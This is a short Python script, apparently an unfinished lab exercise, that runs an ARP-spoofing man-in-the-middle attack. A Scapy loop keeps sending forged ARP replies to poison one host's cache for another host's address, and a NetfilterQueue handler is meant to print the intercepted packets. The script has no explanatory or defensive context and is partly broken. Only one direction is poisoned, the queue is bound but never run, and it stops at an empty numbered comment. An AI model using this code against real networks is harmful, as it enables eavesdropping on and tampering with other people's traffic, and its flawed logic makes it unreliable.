from netfilterqueue import NetfilterQueue

from threading import Thread
from time import sleep
from scapy.all import *

def get_mac(ip):
    req = Ether(dst ="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip)
    ans = srp(req, timeout = 5, verbose = False)[0]
    return ans[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    packet = ARP(op = 2, pdst=target_ip, hwdst= get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose = False)

def MiTM(target_ip, spoof_ip):
    while True:
        spoof(target_ip, spoof_ip)
        spoof(target_ip, spoof_ip)

        sleep(5)
        
def print_and_accept(pkt):
    print(pkt)
    pkt.accept()


try:
    # 1// Start MiTM  
    mitm =Thread(target = MiTM, args = ["172.17.0.2", "172.17.0.3"])
    mitm.start()

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, print_and_accept)
except KeyboardInterrupt:
    mitm.join()
# 2// 
